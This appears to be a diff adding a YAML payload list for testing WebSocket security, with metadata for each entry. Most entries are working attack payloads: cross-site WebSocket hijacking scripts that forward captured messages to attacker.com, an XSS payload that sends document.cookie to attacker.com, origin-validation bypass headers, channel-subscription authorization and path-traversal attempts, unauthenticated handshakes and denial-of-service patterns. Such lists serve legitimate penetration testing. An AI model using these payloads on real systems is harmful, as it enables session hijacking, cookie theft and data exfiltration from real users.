@@ -1,0 +1,101 @@
+# WebSocket Security Testing Payloads with Metadata
+# Usage: Filter by type and context for targeted testing
+
+payloads:
+  # Cross-Site WebSocket Hijacking (CSWSH)
+  - payload: |
+      <script>
+      var ws = new WebSocket('wss://target.com/ws');
+      ws.onmessage = function(e) {
+        fetch('https://attacker.com/log?data=' + encodeURIComponent(e.data));
+      };
+      </script>
+    type: hijacking
+    context: [chat, real-time-update, API-stream]
+    detection: cross-origin-connection
+    note: "Cross-Site WebSocket Hijacking — exploits missing Origin validation on WS handshake"
+
+  - payload: |
+      <script>
+      var ws = new WebSocket('wss://target.com/ws');
+      ws.onopen = function() {
+        ws.send(JSON.stringify({action: 'getProfile'}));
+      };
+      ws.onmessage = function(e) {
+        new Image().src = 'https://attacker.com/exfil?d=' + btoa(e.data);
+      };
+      </script>
+    type: hijacking
+    context: [API-stream, real-time-update]
+    detection: data-exfiltration
+    note: "CSWSH with data exfiltration — sends authenticated requests and leaks responses"
+
+  # Origin validation bypass
+  - payload: "Origin: https://target.com.evil.com"
+    type: hijacking
+    context: [chat, API-stream, notification]
+    detection: origin-bypass
+    note: "WebSocket Origin header with appended attacker domain — tests suffix-matching validation"
+
+  - payload: "Origin: null"
+    type: hijacking
+    context: [chat, API-stream, real-time-update]
+    detection: origin-bypass
+    note: "Null Origin via sandboxed iframe — tests if WebSocket accepts null origin"
+
+  # Message injection — XSS via WebSocket
+  - payload: '{"message": "<img src=x onerror=alert(document.domain)>"}'
+    type: injection
+    context: [chat, notification]
+    detection: xss-execution
+    note: "XSS via WebSocket message — tests if received messages are rendered without sanitization"
+
+  - payload: '{"message": "<script>document.location=''https://attacker.com/?c=''+document.cookie</script>"}'
+    type: injection
+    context: [chat, notification]
+    detection: xss-execution
+    note: "Cookie-stealing XSS via WebSocket — targets chat or notification rendering"
+
+  - payload: '{"type": "subscribe", "channel": "admin"}'
+    type: authorization-bypass
+    context: [real-time-update, notification, API-stream]
+    detection: unauthorized-data
+    note: "Subscribe to privileged channel — tests if authorization is enforced per-channel"
+
+  - payload: '{"type": "subscribe", "channel": "../admin/notifications"}'
+    type: authorization-bypass
+    context: [notification, real-time-update]
+    detection: path-traversal
+    note: "Path traversal in channel subscription — attempts to access restricted channels"
+
+  # Authentication bypass
+  - payload: |
+      GET /ws HTTP/1.1
+      Host: target.com
+      Upgrade: websocket
+      Connection: Upgrade
+      Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+      Sec-WebSocket-Version: 13
+    type: authentication-bypass
+    context: [API-stream, chat, real-time-update]
+    detection: unauthenticated-access
+    note: "Raw WebSocket upgrade without auth token — tests if authentication is required for WS connections"
+
+  - payload: '{"action": "authenticate", "token": "null"}'
+    type: authentication-bypass
+    context: [API-stream, chat]
+    detection: auth-bypass
+    note: "Null token authentication — tests if server accepts null/empty auth tokens"
+
+  # DoS — large message
+  - payload: '{"data": "AAAAAAAAAA....(1MB)....AAAAAAAAAA"}'
+    type: DoS
+    context: [chat, API-stream, real-time-update]
+    detection: resource-exhaustion
+    note: "Send 1MB+ message — tests if server enforces message size limits"
+
+  - payload: "rapid-reconnection: 1000 connections in 10 seconds"
+    type: DoS
+    context: [chat, API-stream, notification]
+    detection: resource-exhaustion
+    note: "Rapid WebSocket reconnection — tests rate limiting on connection establishment"
